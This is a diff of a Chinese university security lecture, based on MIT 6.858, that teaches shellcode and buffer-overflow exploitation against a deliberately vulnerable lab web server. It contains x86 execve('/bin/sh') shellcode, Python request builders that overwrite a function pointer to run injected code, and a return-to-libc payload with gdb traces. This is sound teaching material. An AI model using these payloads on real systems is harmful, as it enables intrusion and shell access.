@@ -1,187 +1,185 @@
-#缓冲区溢出2：分析与触发
+#缓冲区溢出：Shellcode与漏洞利用
 
 ###哈尔滨工业大学 网络与信息安全 张宇 2016
 
-参考课程: [MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm)
+参考课程: [MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm) 
 
 ---
 
-本节课中熟悉实验环境，分析一个Web服务器的逻辑，寻找缓冲区溢出漏洞并触发该漏洞。
+本节课学习shellcode原理，并利用漏洞在服务器上运行shellcode，以及return-to-libc攻击。
 
-## 实验预备
+##Shellcode原理
 
-实验资料见[MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm)中Lab 1。
+参考资料：[Smashing The Stack For Fun And Profit](supplyments/Smashing-The-Stack-For-Fun-And-Profit.pdf) [[online]](http://phrack.org/issues/49/14.html#article)
 
-实验环境为Ubuntu，在VMware Player (VMware Fusion)虚拟机中运行。系统中有两个账号：
+利用缓冲区溢出漏洞改写函数返回地址来劫持程序控制流，令其指向预执行代码。通常该代码会启动一个shell，称作"shellcode"。
 
-- `root`，口令6858，用来安装软件
-- `httpd`，口令6858，运行Web服务器和实验程序
+下面是一个C语言程序启动shell的例子。
 
-本课程实验研究一个web服务器`zookws`。该服务器上运行一个Python的web应用`zoobar`，用户之间转移一种称为“zoobars”的货币。
-
-
-
-1. 在VMware里用`httpd`账号登录后，运行`ifconfig`查看IP地址
-1. 用终端软件通过SSH登录系统`ssh httpd@IP地址`
-1. 运行`scp lab1.zip httpd@IP地址`将实验程序拷贝到`/home/httpd`
-2. 安装`unzip`程序，解压缩文件，并移动到`/home/httpd/lab`
-3. `make`编译程序
-4. 启动服务器`./clean-env.sh ./zookld zook-exstack.conf`
-5. 用浏览器访问zook服务`http://虚拟机IP地址:8080/`
-
-服务器端包含以下主要文件：
-
-- `clean-env.sh`脚本令程序每次运行时栈和内存布局都相同
-- `zookld.c`: 启动`zook.conf`中所配置服务，如`zookd`和`zookfs`
-- `zookd.c`: 将HTTP请求路由到相应服务，如`zookfs`
-- `zookfs.c`: 提供静态文件或执行动态代码服务
-- `http.c`: HTTP实现
-- `index.html`: Web服务器首页
-- `/zoobar`目录：zoobar服务实现
-
-
-
-```
-              |     +—————————+   
-              |     |zookld.c |<—— "zook-*.conf" 
-              |     +———+—————+                 
-              |         |——————————————+
-              |         |              |         +—————————————+
-+——————+    HTTP    +———v———+      +———v————+    |CGI, Database|
-|client| <====|===> |zookd.c|<————>|zookfs.c|———>|"/zoobar"    |
-+——————+      |     +———^———+      +———^————+    +—————————————+ 
-              |         |              | (2) http_request_headers()
-(1) http_request_line() |   +——————+   | (3) http_serve()
-              |         +———|http.c|———+
-              |             +——————+
+``` c
+#include <stdio.h>void main() {   char *name[2];   name[0] = "/bin/sh";   name[1] = NULL;
+   /* int execve(const char *filename, char *const argv[],
+          char *const envp[]);   */   execve(name[0], name, NULL);
+   exit(0);}
 ```
 
+`execve()`在父进程中fork一个子进程，在子进程中调用`exec()`函数启动新的程序。`exec`系列函数中`execve()`为内核级系统调用。 `execve()`执行第一个参数`filename`字符串所指文件，第二个参数是利用数组指针来传递命令行参数(第一个元素是命令本身)，并且要以空指针`null`结束，最后一个参数则为传递给执行文件的新环境变量数组。
 
-服务器端采用CGI (Common Gateway Interface)技术，将客户端请求URL映射到脚本或者普通HTML文件。CGI脚本可以由任意程序语言实现，脚本只需将HTTP头部和HTML文档输出到标准输出。本例CGI由`/zoobar`目录中的python脚本实现，其中也包含一个数据库。目前，我们不需要关心具体zoobar服务内容。
+Linux的`execve()`通过寄存器传递参数，由0x80软中断触发`syscall()`调用，过程如下：
 
-`zookd`和`zookfs`执行程序分别有两个版本：
+1. 内存中存在`null`结尾字符串`"/bin/sh"`
+1. 内存中存在`"/bin/sh"的地址`后加一个`null long word`1. 拷贝`execve`调用编号(`0xb`)到`eax`1. 拷贝`"/bin/sh"的地址`到`ebx`1. 拷贝`"/bin/sh"的地址的地址`到`ecx`1. 拷贝`null long word的地址`到`edx`1. 执行`int $0x80`调用`syscall()`
 
-- `*-exstack`版本有可执行的栈，将攻击代码注入到栈中缓冲区
-- `*-nxstack`版本的栈不可执行，需要用其他技术来运行攻击代码
+若`execve()`调用失败，程序将继续执行，很可能导致崩溃。为在调用失败后仍然可以正常退出，在`execve()`之后添加`exit(0)`：
 
-查看一下被启动的程序：
+1. 拷贝`exit`调用号(`0x1`)到`exa`
+2. 拷贝`0x0`到`exb`
+3. 执行`int $0x80`调用`syscall()`
+
+在shellcode中，多处需要用到地址，一个问题是事先并不知道代码和字符串会被放置在哪里。
+
+解决该问题的一种方法是用`jmp`和`call`指令，通过指令指针相对寻址来跳到特定位置，而不需要事先知道准确地址。
+
+首先，在通过改写返回地址来跳转到shellcode后，利用`jmp`指令跳转到`call`指令。将`call`指令放在`"/bin/sh"`字符串之前，当执行`call`指令时，字符串地址将被入栈，作为`call`被执行时的返回地址。`call`指令只需简单的跳转到`jmp`之后的代码，执行`pop`指令将栈中的`call`的返回地址，即字符串地址，拷贝到一个寄存器使用。
+
+下面是程序描述与跳转示意图：
+
+1. 返回地址跳转到shellcode（跳转1）
+2. `jmp`跳转到`call`（跳转2）
+1. `pop`获得`"/bin/sh"地址`
+1. 执行`execv()`
+1. 执行`exit()`
+1. `call`跳转到`pop`（跳转3）
+1. 字符串`"/bin/sh"`
+
+```
+low address         <———— stack growth ————              high address
+                      
+          +—————————(3)—————————+
+          V                     | 
+   [jmp][pop][execve()][exit()][call]["/bin/sh"][sfp][ret][arguments]
+   ^  |                          ^                    |
+   |  +—————————(2)——————————————+                    |
+   +——————————————————————————————————(1)—————————————+  
+
+```
+
+通常shellcode将被作为字符串注入缓冲区中。由于空字节(null)会被认为是字符串结尾，因此需要将其中的空字节去掉。一种主要手段是用`xorl %eax,%eax`指令来令`eax`寄存器为`0`，用`eax`作为参数，从而避免在参数中直接使用`0`。另外，shellcode越小越好。
+
+在实验中提供了3个文件：
+
+- `shellcode.S`：shellcode汇编代码
+- `shellcode.bin`：编译后二进制代码
+- `run-shellcode`：直接运行`shellcode.bin`
+
+查看完整的shellcode代码`shellcode.S`：
+
+``` gas
+#include <sys/syscall.h>                /* 系统调用编号表 */
+
+#define STRING  "/bin/sh"               /* 执行命令字符串 */
+#define STRLEN  7                       /* 字符串长度 */
+#define ARGV    (STRLEN+1)              /* execve()参数2相对偏移量 */
+#define ENVP    (ARGV+4)                /* execve()参数3相对偏移量 */
+                                        /* argv末尾元素和envp复用同一地址 */
+.globl main                             /* 令符号main对ld和其他程序可见 */
+        .type   main, @function         /* 设置符号main的类型为函数 */
+
+ main:
+        jmp     calladdr                /* 跳转(2)到call */
+
+ popladdr:
+        popl    %esi                    /* 将string地址出栈写入esi */
+        movl    %esi,(ARGV)(%esi)       /* 将string地址写入argv */
+        xorl    %eax,%eax               /* 获得32位的0 */
+        movb    %al,(STRLEN)(%esi)      /* 将string结尾字节置0 */
+        movl    %eax,(ENVP)(%esi)       /* 将envp置0 */
+                                        /* argv末尾元素和envp复用同一0 */
+        movb    $SYS_execve,%al         /* syscall参数1: syscall编号 */
+        movl    %esi,%ebx               /* syscall参数2: string地址 */
+        leal    ARGV(%esi),%ecx         /* syscall参数3: argv地址 */
+        leal    ENVP(%esi),%edx         /* syscall参数4: envp地址 */
+        int     $0x80                   /* 调用syscall */
+
+        xorl    %ebx,%ebx               /* syscall参数2: 0 */
+        movl    %ebx,%eax               /* 将eax置0 */
+        inc     %eax                    /* syscall参数1: SYS_exit (1) */
+                                        /* 用mov+inc来避免空字节 */
+        int     $0x80                   /* 调用syscall */
+
+ calladdr:
+        call    popladdr                /* 将下一指令(string)地址入栈后跳转 */
+        .ascii  STRING                  /* 将字符串(不追加0)存入连续地址 */
+```
+
+下列命令用于编译，提取，反编译，执行shellcode：
+
+- 编译：`gcc -m32 -c -o shellcode.bin shellcode.S`
+- 提取二进制指令：`objcopy -S -O binary -j .text shellcode.bin`
+- 反编译：`objdump -D -b binary -mi386 shellcode.bin`
+- 执行：`./run-shellcode shellcode.bin`
+
+下面是反编译的结果：
+
+``` gas
+$ objdump -D -b binary -mi386 shellcode.bin
+
+shellcode.bin:     file format binary
+Disassembly of section .data:
+
+00000000 <.data>:
+   0:   eb 1f                   jmp    0x21
+   2:   5e                      pop    %esi
+   3:   89 76 08                mov    %esi,0x8(%esi)
+   6:   31 c0                   xor    %eax,%eax
+   8:   88 46 07                mov    %al,0x7(%esi)
+   b:   89 46 0c                mov    %eax,0xc(%esi)
+   e:   b0 0b                   mov    $0xb,%al
+  10:   89 f3                   mov    %esi,%ebx
+  12:   8d 4e 08                lea    0x8(%esi),%ecx
+  15:   8d 56 0c                lea    0xc(%esi),%edx
+  18:   cd 80                   int    $0x80
+  1a:   31 db                   xor    %ebx,%ebx
+  1c:   89 d8                   mov    %ebx,%eax
+  1e:   40                      inc    %eax
+  1f:   cd 80                   int    $0x80
+  21:   e8 dc ff ff ff          call   0x2
+  26:   2f                      das                       # /bin/sh
+  27:   62 69 6e                bound  %ebp,0x6e(%ecx)
+  2a:   2f                      das
+  2b:   73 68                   jae    0x95
+```
+
+运行上述shellcode可以启动一个新shell：
 
 ``` sh
-$ ps -fp $(pgrep zook)
-UID        PID  PPID  C STIME TTY      STAT   TIME CMD
-httpd     4448  2493  0 15:44 pts/3    S+     0:00 /home/httpd/lab/zookld zook-exstack.conf
-httpd     4453  4448  0 15:44 pts/3    S+     0:00 zookd-exstack 5
-httpd     4454  4448  0 15:44 pts/3    S+     0:00 zookfs-exstack 6
+$ ./run-shellcode shellcode.bin
+$ 
 ```
-
-服务器采用这一架构的原因会在之后的课程中学习。
-
 ---
 
-##HTTP简介
+##代码注入
 
-参考资料：[How the web works: HTTP and CGI explained](supplyments/How-the-web-works.pdf)
+利用之前的漏洞将shellcode注入到web服务器并启动shell。回顾之前的漏洞触发过程：
 
-HTTP请求格式：
+(1) 构造"过长的"客户端请求，并发送请求到服务器。
 
-```
-[METH] [REQUEST-URI] HTTP/[VER]
-Field1: Value1
-Field2: Value2
-
-[request body, if any]
-```
-HTTP请求例子：
-
-```
-GET / HTTP/1.0
-User-Agent: Mozilla/3.0 (compatible; Opera/3.0; Windows 95/NT4)
-Accept: */*
-Host: birk105.studby.uio.no:81
+``` python
+def build_exploit(shellcode):
+	req =   "GET /" + 'A' * 1024 + " HTTP/1.0\r\n" + \
+   		     "\r\n"
+	return req
 ```
 
-HTTP应答格式：
-
-```
-HTTP/[VER] [CODE] [TEXT]
-Field1: Value1
-Field2: Value2
-
-...Document content here...
-```
-HTTP应答例子：
-
-```
-HTTP/1.0 200 OK
-Server: Netscape-Communications/1.1
-Date: Tuesday, 25-Nov-97 01:22:04 GMT
-Last-modified: Thursday, 20-Nov-97 10:44:53 GMT
-Content-length: 6372
-Content-type: text/html
-
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
-<HTML>
-...followed by document content...
-```
-
----
-
-### 寻找漏洞
-
-缓冲区溢出存在的要素：数组（字符串），串处理/读取函数（写操作）。
-
-数组：`char * s`, `char s[128]`, `int a[128]`, `void * p`。
-
-函数： `strcpy()`, `strcat()`, `sprintf()`, `vsprintf()`, `gets()`, `getc()`, `read()`, `scanf()`, `getenv()`。
-
-除了调用函数外，还可能通过`for/while {}`循环的方式来访问缓冲区。
-
-在源码中搜索一个‘危险’函数`strcpy()`。
+(2) 服务器端`zookd`处理请求并转发给`zookfs`。处理请求的代码在`http.c`中，其中存在缓冲区溢出漏洞。
 
 ``` c
-$ grep -n 'strcpy' *.c
-http.c:344:    strcpy(dst, dirname);
+zookd.c:70:    if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
+
+zookfs.c:47:    http_serve(sockfd, getenv("REQUEST_URI"));
+
 ```
-在`http.c`中找到了一处潜在漏洞，来具体看一下代码。
-
-``` c
-void dir_join(char *dst, const char *dirname, const char *filename) {
-    strcpy(dst, dirname);
-    if (dst[strlen(dst) - 1] != '/')
-        strcat(dst, "/");
-    strcat(dst, filename);
-}
-```
-
-`dir_join()`函数将`dirname`和`filename`先后拷贝到`dst`中。显然，这里并没有检查每一个字符串长度。若`dirname`长度比`dst`缓冲长，则`strcpy()`调用存在缓冲区溢出风险。
-
-进一步检查使用`dir_join()`时是否存在导致缓冲区溢出的可能：
-
-``` c
-void http_serve_directory(int fd, const char *pn) {
-    /* for directories, use index.html or similar in that directory */
-    static const char * const indices[] = {"index.html", "index.php", "index.cgi", NULL};
-    char name[1024];
-    struct stat st;
-    int i;
-
-    for (i = 0; indices[i]; i++) {
-        dir_join(name, pn, indices[i]);
-        if (stat(name, &st) == 0 && S_ISREG(st.st_mode)) {
-            dir_join(name, getenv("SCRIPT_NAME"), indices[i]);
-            break;
-        }
-    }
-
-    if (indices[i] == NULL) {
-        http_err(fd, 403, "No index file in %s", pn);
-        return;
-    }
-
-    http_serve(fd, name);
-}
-```
-在`dir_join(name, pn, indices[i]);`调用中，`char name[]`长度为1024。`char * pn`长度待定，继续查看`http_serve_directory()`调用情况。
+`http_serve()`函数中`strcat()`触发缓冲区溢出漏洞导致`handler`变量被改写，在执行`(*handler)()`函数时导致程序崩溃。
 
 ``` c
 void http_serve(int fd, const char *name)
@@ -196,261 +194,13 @@ void http_serve(int fd, const char *name)
     strcat(pn, name);
     split_path(pn);
 
-    if (!stat(pn, &st))
-    {
-        /* executable bits -- run as CGI script */
-        if (valid_cgi_script(&st))
-            handler = http_serve_executable;
-        else if (S_ISDIR(st.st_mode))
-            handler = http_serve_directory;
-        else
-            handler = http_serve_file;
-    }
-
+    /* ...代码有删节... */
+    
     handler(fd, pn);
 }
 ```
-`handler = http_serve_directory`，`handler()`中的`pn`长度1024，内容来自`getcwd()`加上`strcat(pn, name)`。若`name`过长，则`pn`长度也将过长。通过进一步分析`http_serve()`调用过程，发现`name`内容来自于环境变量`REQUEST_URI`。
 
-``` c
-zookfs.c:47:   http_serve(sockfd, getenv("REQUEST_URI"));
-```
-该环境变量在`http.c`中`http_request_line()`函数中被设置。
-
-``` c
-http.c:107:    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
-```
-
-在`zookd.c`中，`http_request_line()`函数被`process_client()`函数调用。
-
-```
-zookd.c:70:    if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
-```
-
-我们把这一漏洞命名为“LONG_URI”漏洞，回顾分析过程如下：
-
-``` c
-http.c:344:    strcpy(dst, dirname) // dst size = ?
-|                                  //  |
-dir_join(name, pn, indices[i]);   // name size = 1024
-|                                //  |
-handler(fd, pn);                // pn size = 1024
-|
-zookfs.c:47:    http_serve(sockfd, getenv("REQUEST_URI"));
-|      
-http.c:107:    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
-|
-zookd.c:70:    if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
-```
----
-## 触发漏洞
-
-首先，该漏洞必须能改写栈中的一个返回地址；其次，改写一些数据结构来用于夺取程序的控制流。撰写触发该漏洞的程序，并验证改程序可以导致web服务器崩溃（通过`dmesg | tail`, 使用`gdb`, 或直接观察）。
-
-漏洞利用程序模板为`exploit-template.py`，该程序向服务器发送特殊请求。
-
-首先启动服务：`./clean-env.sh ./zookld zook-exstack.conf`。
-下面是是未改写的`exploit-template.py`执行结果。
-
-``` html
-$ ./exploit-template.py 127.0.0.1 8080
-HTTP request:
-GET / HTTP/1.0       <-- 客户端请求：方法，URL，HTTP版本号
-
-Connecting to 127.0.0.1:8080...
-Connected, sending request...
-Request sent, waiting for reply...
-Received reply.
-HTTP response:
-HTTP/1.0 200 OK      <-- HTTP版本号，状态代码
-<html>               <-- 文档
-<head>
-  <meta http-equiv="refresh" content="0; URL=zoobar/index.cgi/" />
-</head>
-<body>
-  <a href="zoobar/index.cgi/">Click here</a>
-</body>
-</html>
-```
-我们发现了可由我们控制的用户输入，客户端请求位于下面代码中： 
-
-``` python
-## This is the function that you should modify to construct an
-## HTTP request that will cause a buffer overflow in some part
-## of the zookws web server and exploit it.
-
-def build_exploit(shellcode):
-    ## Things that you might find useful in constructing your exploit:
-    ##   urllib.quote(s)
-    ##     returns string s with "special" characters percent-encoded
-    ##   struct.pack("<I", x)
-    ##     returns the 4-byte binary encoding of the 32-bit integer x
-    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)
-
-    req =   "GET / HTTP/1.0\r\n" + \
-            "\r\n"
-    return req
-```
-
-目前，我们手上有了两个攻击服务器的武器：(1) “LONG_URI”缓冲区溢出漏洞，(2)构造请求输入`req`的脚本。下一步就是要分析`http.c`中处理该请求的代码，将`req`中内容和`REQUEST_URI`对应起来。
-
-通过分析代码可以发现，HTTP请求中的路径，例如`/foo.html`，被赋予了`REQUEST_URI`变量，因此可以通过构造较长的HTTP请求路径来令缓冲区溢出。
-下面的代码有删节。
-
-``` c
-const char *http_request_line(int fd, char *reqpath, char *env, size_t *env_len)
-{
-    static char buf[8192];      /* static variables are not on the stack */
-    char *sp1, *sp2, *qp, *envp = env;
-    //  ... ... 
-    if (http_read_line(fd, buf, sizeof(buf)) < 0)
-        return "Socket IO error";
-
-    /* Parse request like "GET /foo.html HTTP/1.0" */
-    sp1 = strchr(buf, ' ');
-    if (!sp1)
-        return "Cannot parse HTTP request (1)";
-    *sp1 = '\0';
-    sp1++;
-    if (*sp1 != '/')
-        return "Bad request path";
-    sp2 = strchr(sp1, ' ');
-    if (!sp2)
-        return "Cannot parse HTTP request (2)";
-    *sp2 = '\0';
-    sp2++;
-    //  ... ...
-    /* decode URL escape sequences in the requested path into reqpath */
-    url_decode(reqpath, sp1);
-    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
-    //  ... ...
-}
-```
-
-之前发现缓冲区有1024字节，我们就令请求路径超过1024字节。
-
-``` python
- req =   "GET /" + 'A' * 1024 + " HTTP/1.0\r\n" + \
-            "\r\n"
-```
-将攻击脚本复制两份，命名为`exploit-2a.py`和`exploit-2b.py`，并用`make check-crash`来验证是否导致程序崩溃。
-
-``` sh
-$ make check-crash
-./check-bin.sh
-./check-part2.sh zook-exstack.conf ./exploit-2a.py
-./check-part2.sh: line 8:  4398 Terminated              strace -f -e none -o "$STRACELOG" ./clean-env.sh ./zookld $1 &> /dev/null
-4417  --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
-4417  +++ killed by SIGSEGV +++
-PASS ./exploit-2a.py
-./check-part2.sh zook-exstack.conf ./exploit-2b.py
-./check-part2.sh: line 8:  4423 Terminated              strace -f -e none -o "$STRACELOG" ./clean-env.sh ./zookld $1 &> /dev/null
-4442  --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
-4442  +++ killed by SIGSEGV +++
-PASS ./exploit-2b.py
-```
-
-该程序并通过(PASS)了检查。缓冲区漏洞导致程序因为SIGSEV信号而崩溃，指令地址被改写为`si_addr=0x41414141`。下面看看具体发生了什么。
-
-使用`gdb -p 进程号`来调试程序。进程号可通过两种方法获得：观察`zookld`在终端输出子进程ID；或者使用`pgrep`，例如`gdb -p $(pgrep zookd-exstack)`。
-
-使用`gdb`过程中，当父进程`zookld`被`^C`杀死时，被`gdb`调试的子进程并不会被终止。这将导致无法重启web服务器。因此，在重启`zookld`之前，应先退出`gdb`。
-
-当生成子进程时，`gdb`缺省情况下仍然调试父进程，而不会跟踪子进程。由于`zookfs`为每个服务请求生成一个子进程，为了自动跟踪子进程，使用`set follow-fork-mode child`命令。该命令已经被加入`/home/httpd/lab/.gdbinit`中，`gdb`启动时会自动执行。
-
-调试流程如下：
-
-1. 在终端1中，重启服务：
-`$ ./clean-env.sh ./zookld zook-exstack.conf`。
-1. 在终端2中，启动`gdb`（`gdb -p PID`），并设置断点（`b`命令）。
-1. 在终端3中，运行漏洞触发程序 `./exploit-2a.py localhost 8080`。
-1. 返回终端2，继续调试（`c`命令）。
-
-首先，调试`zookd`。`http_request_line`负责处理HTTP请求。
-
-``` gas
-$ gdb -p $(pgrep zookd-exstack)
-...
-(gdb) b http_request_line
-Breakpoint 1 at 0x8049150: file http.c, line 67.
-[运行漏洞触发程序]
-(gdb) c
-Continuing.
-
-Breakpoint 1, http_request_line (fd=5, reqpath=0xbfffee08 "", env=0x804e520 <env> "", env_len=0x8050520 <env_len>) at http.c:67
-warning: Source file is more recent than executable.
-67          char *sp1, *sp2, *qp, *envp = env; 
-(gdb) n
-[执行n多次直到REQUEST_URI被处理完]
-(gdb) n
-109         envp += sprintf(envp, "SERVER_NAME=zoobar.org") + 1;
-(gdb) x/10 buf        [打印buf，请求中各字段已经被分割]
-0x8050540 <buf.4435>:   "GET"
-0x8050544 <buf.4435+4>: "/", 'A' <repeats 199 times>...
-0x805060c <buf.4435+204>:       'A' <repeats 200 times>...
-0x80506d4 <buf.4435+404>:       'A' <repeats 200 times>...
-0x805079c <buf.4435+604>:       'A' <repeats 200 times>...
-0x8050864 <buf.4435+804>:       'A' <repeats 200 times>...
-0x805092c <buf.4435+1004>:      'A' <repeats 25 times>
-0x8050946 <buf.4435+1030>:      "HTTP/1.0"
-0x805094f <buf.4435+1039>:      ""
-0x8050950 <buf.4435+1040>:      ""
-(gdb) x/10 reqpath    [打印reqpath，为"/", A * 1024]
-0xbfffee08:     "/", 'A' <repeats 199 times>...
-0xbfffeed0:     'A' <repeats 200 times>...
-0xbfffef98:     'A' <repeats 200 times>...
-0xbffff060:     'A' <repeats 200 times>...
-0xbffff128:     'A' <repeats 200 times>...
-0xbffff1f0:     'A' <repeats 25 times>
-0xbffff20a:     "\005\b|\365\377\277"
-0xbffff211:     ""
-0xbffff212:     ""
-0xbffff213:     ""
-(gdb) p sizeof reqpath  [reqpath不会溢出]
-$3 = 2048
-(gdb) p sizeof env      [env不会溢出]
-$4 = 8192
-[继续用n命令执行]
-85          if (sendfd(svcfds[i], env, env_len, fd) <= 0)
-[此时zookd将请求发送给zookfs]
-(gdb) quit
-```
-
-`zookd`此时并不存在缓冲区溢出，接下来分析`zookfs`。
-
-在`zookfs.c`中，`http_serve()`函数以`REQUEST_URI`环境变量为参数。在`http_serve`处设置断点，分析栈结构。
-
-``` gas
-$ gdb -p $(pgrep zookfs-exstack)
-...
-(gdb) b http_serve
-Breakpoint 1 at 0x804951c: file http.c, line 275.
-[运行漏洞触发程序]
-(gdb) c
-Continuing.
-[New process 5076]
-[Switching to process 5076]
-
-Breakpoint 1, http_serve (fd=3, name=0x80510b4 "/", 'A' <repeats 199 times>...) at http.c:275
-warning: Source file is more recent than executable.
-275         void (*handler)(int, const char *) = http_serve_none;
-(gdb) p $ebp
-$1 = (void *) 0xbfffde08
-(gdb) p &handler
-$2 = (void (**)(int, const char *)) 0xbfffddfc
-(gdb) p &pn
-$3 = (char (*)[1024]) 0xbfffd9fc
-(gdb) p &st
-$4 = (struct stat *) 0xbfffd9a4
-(gdb) p &fd
-$5 = (int *) 0xbfffde10
-(gdb) P &name
-$6 = (const char **) 0xbfffde14
-(gdb) x $ebp+4
-0xbfffde0c:     0x08048d86
-```
-
-根据上面的调试信息绘制`http_serve()`的栈结构：
+`http_serve()`的栈结构：
 
 ```
 +———————————————————————-+   
@@ -476,88 +226,223 @@ $6 = (const char **) 0xbfffde14
 
 ```
 
-继续执行到`strcat()`，
+攻击手段是构造一个请求令`pn`缓冲区溢出，从而改写`handler`指针，令其指向shellcode。
 
-``` gas
-(gdb) n
-279         getcwd(pn, sizeof(pn));
-(gdb) n
-280         setenv("DOCUMENT_ROOT", pn, 1);
-(gdb) n
-282         strcat(pn, name);
-(gdb) p pn
-$7 = "/home/httpd/lab\000", 'A' <repeats 504 times>...
-(gdb) p strlen(name)
-$8 = 1025
-(gdb) p sizeof pn
-$9 = 1024
+```  
+        bottom of the stack                               
++————————————————————+———————————+——————————————————————+
+|  void (*handler)   |  ^        | address of shellcode |———+
++————————————————————+  |        +——————————————————————+   |      
+|pn[1023]   ^        |  |        |    'AAA'...'AAA'     |   |
+|           |        |  |        +——————————————————————+   |
+|           |        |  | name[0]|      shellcode       |<——+
+|           |        +———————————+——————————————————————+
+|           |   pn[0]|   getwd   |  "/home/httpd/lab/"  |
++————————————————————+———————————+——————————————————————+<——0xbfffd9fc
+
+```
+以此构造请求需要计算两个值：
+
+- 填充'A'的个数：`1024-len("/home/httpd/lab/")-len(shellcode)`
+- shellcode在栈中地址：`0xbfffd9fc + len("/home/httpd/lab/")`
+
+``` python
+stack_buffer = 0xbfffd9fc
+
+def build_exploit(shellcode):
+    ## Things that you might find useful in constructing your exploit:
+    ##   urllib.quote(s)
+    ##     returns string s with "special" characters percent-encoded
+    ##   struct.pack("<I", x)
+    ##     returns the 4-byte binary encoding of the 32-bit integer x
+    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)
+
+    req =   "GET /" + urllib.quote(shellcode) + \
+             'A' * (1024-len("/home/httpd/lab/")-len(shellcode)) + \
+            struct.pack("<I", stack_buffer + len("/home/httpd/lab/")) + \
+            " HTTP/1.0\r\n" + \
+            "\r\n"
+    return req
+
+```
+运行脚本`./exploit-3.py localhost 8080`，并在启动web服务的中断查看shell是否被启动。
+
+---
+
+## Return-to-libc攻击
+
+参考资料：[Bypassing non-executable-stack during exploitation using return-to-libc](http://css.csail.mit.edu/6.858/2014/readings/return-to-libc.pdf)
+
+大多数操作系统为了防御缓冲区溢出攻击，不允许栈中内容执行，在栈中注入shellcode的方法就失效了。一种可以绕过不可执行栈的方法是**return-to-libc**攻击。该攻击将控制流引向标准库libc中函数，而不需要向栈中注入代码。攻击分为3步：
+
+1. 查找欲利用的在标准库libc中函数的位置，例如`execl`，`system`，或`unlink`
+1. 改写返回地址为libc函数地址，在栈中布置函数参数，构造一个libc函数的调用环境
+1. 待有漏洞函数返回时，根据返回地址调转到libc函数
+
+启动不可执行栈服务：
+
+```
+$ ./clean-env.sh ./zookld zook-nxstack.conf
 ```
 
-此处将执行`strcat()`，在`pn`中已经包含的来自`getcwd()`的字符串后面加上长度1025的`name`，将超过`pn`所分配的大小1024，导致缓冲区溢出。接着执行一步，并查看缓冲区溢出情况。
+首先，用`gdb`查找libc中函数`system()`地址。
+
+``` sh
+$ gdb -q -p $(pgrep zookfs)
+(gdb) p system
+$1 = {<text variable, no debug info>} 0x40065100 <__libc_system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0x40058150 <__GI_exit>
+``` 
+
+得到了`system()`地址为`0x40065100`。但其中最后一个字节的`0x00`导致其不能在字符串中出现。因此，在本漏洞中无法直接使用，下一节课我们会学习这意味着什么。
+
+下面用`exit(16843009)`(`16843009`=`0x01010101`)来演示，函数地址`0x40058150`。
+
+为了令`http_serve()`正常执行后返回，不能改写`handler`。记录`handler`初始值备用。
+
+``` sh
+(gdb) p handler
+$2 = (void (*)(int, const char *)) 0x80495ea <http_serve_none>
+```
+
+
+[](为了执行`system("/bin/sh")`，还需要一个`"/bin/sh"`字符串。有些情况下，该字符串在环境变量`SHELL`的值中，而环境变量在启动进程时已经被作为参数压入栈底，可用`gdb`在栈中搜索，例如`x/1000s $esp`。本例中未载入该环境变量，需在缓冲区中添加。)
+
+
+然后，在栈中布置参数为调用做准备。当漏洞函数返回时，根据返回地址跳转到libc函数，libc函数从栈中读取参数。
+
+```  
+     stack bottom                           
++———————————————————————————————————————————————————————+ (0x01010101)  
+|       name         |<——— (+12) |      argument        | (16843009)
++————————————————————+           +——————————————————————+   
+|      fd = 3        |<——— (+8)  |    return address    | (ABCD)
++————————————————————+           +——————————————————————+
+|   return address   |<——— (+4)  |    exit() address    | (0x40058150)
++————————————————————+           +——————————————————————+
+|        ebp         |<——— (0)   |                      |<——0xbfffde08
++————————————————————+           |                      |
+|                    |           |                      |
++————————————————————+           +——————————————————————+
+|  void (*handler)   |  ^        |     unchanged        | (0x80495ea)
++————————————————————+  |        +——————————————————————+         
+|pn[1023]   ^        |  |        |                      |   
+|           |        |  |        |                      |   
+|           |        |  | name[0]|                      |
+|           |        +———————————+——————————————————————+
+|           |   pn[0]|   getwd   |  "/home/httpd/lab/"  |
++———————————————————————————————————————————————————————+<——0xbfffd9fc
+
+```
+
+构造HTTP请求：
+
+``` python
+def build_exploit(shellcode):
+
+    handler = 0x80495ea
+    exit_addr = 0x40058150
+    exit_status = 0x01010101
+
+    req =   "GET /" + \
+            'A' * (1024-len("/home/httpd/lab/")) + \
+            struct.pack("<I",handler) + \
+            'A' * 12 + \
+            struct.pack("<I",exit_addr) + \
+            "ABCD" + \
+            struct.pack("<I",exit_status) + \
+            " HTTP/1.0\r\n" + \
+            "\r\n"
+    return req
+
+```
+
+用`gdb`调试来演示攻击过程与结果：
 
 ``` gas
+$ gdb -p $(pgrep zookfs)
+(gdb) b http_serve
+Breakpoint 1 at 0x804951c: file http.c, line 275.
+(gdb) c
+Continuing.
+
+[发送请求: ./exploit-4sh.py localhost 8080]
+
+[New process 9883]
+[Switching to process 9883]
+
+Breakpoint 1, http_serve (fd=3, name=0x80510b4 "/", 'A' <repeats 199 times>...) at http.c:275
+warning: Source file is more recent than executable.
+275         void (*handler)(int, const char *) = http_serve_none;
 (gdb) n
+279         getcwd(pn, sizeof(pn));
+(gdb)
+280         setenv("DOCUMENT_ROOT", pn, 1);
+(gdb)
+282         strcat(pn, name);
+(gdb)
 283         split_path(pn);
-(gdb) x/10s pn
+(gdb) x/10s pn        [查看buffer]
 0xbfffd9fc:     "/home/httpd/lab/", 'A' <repeats 184 times>...
 0xbfffdac4:     'A' <repeats 200 times>...
